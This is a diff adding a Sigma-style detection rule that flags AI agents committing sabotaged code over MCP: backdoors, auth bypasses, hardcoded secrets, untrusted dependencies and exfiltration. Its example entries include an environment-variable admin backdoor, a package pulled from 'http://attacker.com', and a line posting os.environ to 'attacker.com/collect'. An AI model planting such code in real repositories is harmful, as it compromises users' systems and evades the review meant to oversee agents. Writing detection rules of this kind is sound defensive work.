@@ -1,0 +1,284 @@
+title: MCP Agent Code Sabotage Detection
+id: 7f3a8b2c-4d5e-6f7a-8b9c-0d1e2f3a4b5c
+status: experimental
+description: |
+  Detects potential code sabotage through MCP-enabled AI agents committing malicious code,
+  backdoors, vulnerabilities, or suspicious patterns into source code repositories.
+  This rule monitors agent-generated code commits and pull requests for indicators of
+  malicious code injection, hardcoded credentials, suspicious dependencies, authentication
+  bypasses, and data exfiltration patterns.
+  
+  Code sabotage attacks can introduce security vulnerabilities, backdoors, or malicious
+  functionality that may persist in codebases and be deployed to production, causing
+  long-term security impacts.
+author: SAFE-MCP Team
+date: 2025-11-20
+modified: 2025-11-20
+references:
+  - https://github.com/safe-mcp/techniques/SAFE-T2103
+  - https://genai.owasp.org/llmrisk/llm01-prompt-injection/
+  - https://genai.owasp.org/llmrisk/llm02-insecure-output-handling/
+  - https://genai.owasp.org/llmrisk/llm06-excessive-agency/
+  - https://attack.mitre.org/techniques/T1495/
+  - https://attack.mitre.org/techniques/T1574/
+logsource:
+  product: mcp
+  service: code_generation
+  category: repository_operations
+detection:
+  # Detect suspicious code patterns in agent-generated code
+  selection_suspicious_code:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|contains:
+      - 'os.getenv('           # Environment variable access (potential debug bypass)
+      - 'DEBUG_AUTH'           # Debug authentication flags
+      - 'BACKDOOR'             # Explicit backdoor references
+      - 'eval('                # Code execution via eval
+      - 'exec('                # Code execution via exec
+      - '__import__'           # Dynamic imports (potential code injection)
+      - 'subprocess.call'      # Subprocess execution
+      - 'subprocess.run'       # Subprocess execution
+      - 'subprocess.Popen'     # Subprocess execution
+      - 'requests.post'       # Outbound HTTP requests (potential exfiltration)
+      - 'urllib.request.urlopen'  # Outbound HTTP requests
+      - 'base64.b64decode'    # Base64 decoding (potential obfuscation)
+      - 'pickle.loads'        # Pickle deserialization (RCE risk)
+      - 'marshal.loads'       # Marshal deserialization
+      - 'yaml.load'           # YAML deserialization (RCE risk)
+      - 'compile('            # Dynamic code compilation
+      - 'globals()'            # Global namespace access
+      - 'locals()'             # Local namespace access
+  
+  # Detect hardcoded credentials and secrets
+  selection_hardcoded_creds:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|re: '(password|secret|key|token|api_key|apikey|access_token)\s*=\s*["\'][^"\']{8,}["\']'
+    # Matches: password = "somevalue", secret = 'value', etc.
+  
+  # Detect suspicious dependencies in package files
+  selection_suspicious_deps:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    file_path|endswith:
+      - 'requirements.txt'
+      - 'package.json'
+      - 'pom.xml'
+      - 'Gemfile'
+      - 'Cargo.toml'
+      - 'go.mod'
+    code_content|contains:
+      - '@attacker.com'
+      - 'malicious'
+      - 'backdoor'
+      - '.local'
+      - 'http://'              # Non-HTTPS package sources
+      - 'git+http://'          # Git dependencies over HTTP
+      - 'file://'              # Local file dependencies
+  
+  # Detect authentication bypass patterns
+  selection_auth_bypass:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|contains:
+      - 'if user == "admin"'
+      - 'return True'          # Always-true authentication
+      - 'bypass'
+      - 'skip_validation'
+      - 'DEBUG_MODE'
+      - 'is_admin = True'
+      - 'authenticated = True'
+      - 'check_auth() == False'  # Inverted logic
+  
+  # Detect data exfiltration patterns
+  selection_data_exfil:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|contains:
+      - 'requests.post'
+      - 'requests.get'
+      - 'urllib.request'
+      - 'urllib2.urlopen'
+      - 'socket.connect'
+      - 'http.client'
+      - 'httplib'
+      - 'curl'
+    code_content|re: '(attacker|malicious|exfil|collect|steal|send.*data|post.*secret)'
+  
+  # Detect SQL injection vulnerabilities
+  selection_sql_injection:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|re: '(SELECT|INSERT|UPDATE|DELETE).*\+.*(request|input|param|user_input)'
+    # Matches SQL queries with string concatenation from user input
+  
+  # Detect command injection patterns
+  selection_command_injection:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    code_content|re: '(os\.system|subprocess|popen|shell_exec|exec|eval).*\+.*(request|input|param)'
+    # Matches command execution with user input concatenation
+  
+  # Detect unusual commit patterns from agents
+  selection_unusual_commits:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    commit_count: '>5'
+    time_window: '1h'
+    files_modified|contains:
+      - 'auth'
+      - 'security'
+      - 'config'
+      - 'credentials'
+      - 'secret'
+      - 'password'
+      - '.env'
+      - 'settings.py'
+      - 'config.py'
+  
+  # Detect modifications to security-critical files
+  selection_security_file_mod:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    file_path|contains:
+      - '/auth'
+      - '/security'
+      - '/crypto'
+      - '/encryption'
+      - '/validation'
+      - 'middleware'
+      - 'permission'
+      - 'access_control'
+  
+  # Detect suspicious commit messages
+  selection_suspicious_commit_msg:
+    event_type: 'code_commit'
+    source: 'mcp_agent'
+    commit_message|re: '(fix.*security|improve.*auth|add.*debug|temporary.*bypass)'
+    # May indicate attempts to hide malicious changes
+  
+  condition: 
+    selection_suspicious_code or 
+    selection_hardcoded_creds or 
+    selection_suspicious_deps or 
+    selection_auth_bypass or 
+    selection_data_exfil or 
+    selection_sql_injection or
+    selection_command_injection or
+    (selection_unusual_commits and selection_security_file_mod) or
+    selection_suspicious_commit_msg
+
+falsepositives:
+  - Legitimate debugging code with proper safeguards and environment checks
+  - Valid use of environment variables for configuration in secure contexts
+  - Legitimate external API calls for monitoring, logging, or integrations
+  - Normal dependency updates from trusted package repositories
+  - Legitimate authentication logic that may match bypass patterns
+  - Development and testing code in appropriate non-production environments
+  - Valid use of subprocess for system administration tasks
+  - Legitimate serialization/deserialization in safe contexts
+  - Normal code generation patterns that happen to match signatures
+
+level: high
+
+tags:
+  - attack.impact
+  - attack.t1495  # Supply Chain Compromise
+  - attack.t1574  # Hijack Execution Flow
+  - attack.t1195  # Supply Chain Compromise: Compromise Software Supply Chain
+  - safe.t2103
+  - safe.t1001    # Related: Tool Poisoning Attack
+  - safe.t1102    # Related: Prompt Injection
+  - safe.t1104    # Related: Over-Privileged Tool Abuse
+  - mcp.code_generation
+  - mcp.repository_operations
+  - code_sabotage
+  - supply_chain
+
+fields:
+  - event_type
+  - source
+  - code_content
+  - file_path
+  - commit_message
+  - commit_hash
+  - user_id
+  - session_id
+  - timestamp
+  - files_modified
+  - commit_count
+  - time_window
+
+notes: |
+  IMPORTANT LIMITATIONS:
+  
+  1. Pattern-based detection has significant limitations for code sabotage attacks.
+     Sophisticated adversaries can craft malicious code that bypasses static pattern
+     matching while still containing security vulnerabilities or backdoors.
+  
+  2. This rule should be part of a multi-layered defense strategy including:
+     - Static Application Security Testing (SAST) tools
+     - Dependency vulnerability scanners
+     - Secret detection tools
+     - Semantic code analysis
+     - Human code review for all agent-generated code
+     - Behavioral analysis of agent code generation patterns
+  
+  3. Context is critical. Many false positives will occur without proper tuning
+     to your specific codebase, development patterns, and acceptable code generation
+     practices.
+  
+  4. Consider implementing AI-based code analysis that can identify novel
+     malicious patterns not covered by static rules.
+  
+  5. Regular updates to detection patterns are essential as attack techniques evolve.
+  
+  RECOMMENDED COMPLEMENTARY CONTROLS:
+  
+  - Implement mandatory human code review for all agent-generated code
+  - Deploy SAST and security scanning tools on all commits
+  - Use semantic analysis to detect deviations from requirements
+  - Monitor agent behavior and code generation patterns
+  - Maintain comprehensive audit logs of all agent activities
+  - Implement code generation policies and scope restrictions
+  - Use sandboxed environments for code execution testing
+
+examples:
+  - description: Backdoor injection via environment variable check
+    log_source: git_repository
+    detection: selection_suspicious_code, selection_auth_bypass
+    code: "if os.getenv('DEBUG_AUTH') == 'true': return {'user': 'admin'}"
+    verdict: malicious
+    
+  - description: Hardcoded API key in agent-generated code
+    log_source: git_repository
+    detection: selection_hardcoded_creds
+    code: "api_key = 'sk-1234567890abcdef'"
+    verdict: malicious
+    
+  - description: Suspicious dependency from untrusted source
+    log_source: git_repository
+    detection: selection_suspicious_deps
+    file: requirements.txt
+    code: "malicious-package @ http://attacker.com/package"
+    verdict: malicious
+    
+  - description: Data exfiltration via HTTP POST
+    log_source: git_repository
+    detection: selection_data_exfil
+    code: "requests.post('https://attacker.com/collect', json=os.environ)"
+    verdict: malicious
+    
+  - description: Legitimate environment variable usage
+    log_source: git_repository
+    detection: selection_suspicious_code
+    code: "database_url = os.getenv('DATABASE_URL', 'postgresql://localhost')"
+    verdict: benign
+    
+  - description: Legitimate external API call for monitoring
+    log_source: git_repository
+    detection: selection_data_exfil
+    code: "requests.post('https://monitoring.example.com/metrics', json=metrics)"
+    verdict: benign
+
